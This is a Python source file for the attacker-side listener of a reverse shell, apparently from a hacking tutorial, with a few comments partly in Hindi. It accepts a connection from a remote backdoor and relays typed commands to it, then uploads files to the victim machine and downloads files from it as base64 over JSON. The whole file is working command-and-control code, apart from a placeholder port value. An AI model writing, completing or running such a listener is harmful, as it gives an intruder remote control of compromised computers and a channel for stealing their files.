import socket , json , base64

class Listener :

    def __init__(self , ip , port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.listener.bind((ip, port))
            self.listener.listen(0)
        except Exception as e:
            print(f"[!] Error binding to {ip}:{port} - {e}")
            return
        print("[*] Listening for incoming connections...")
        self.connection , self.address = self.listener.accept()
        print("[*] Connection established!")

    def reliable_send(self , data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                chunk = self.connection.recv(4096).decode()
                if not chunk:
                    break
                json_data += chunk
                try:
                    return json.loads(json_data)
                except json.JSONDecodeError:
                    continue
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                continue
            except Exception as e:
                print(f"Connection error: {e}")
                break
        return None
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        
        return self.reliable_receive()
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # base64 encode 

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # base64 decode karke 
        return "File uploaded successfully\n".encode() if content else "No content to write\n".encode()    
    
    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if(command[0] == "download"):
                    self.write_file(command[1] , result)
            except Exception as e:
                result = "[!] Error: " + str(e)     

            print(result, end="")

my_listener = Listener("0.0.0.0" , "Port number here as integer")
my_listener.run()


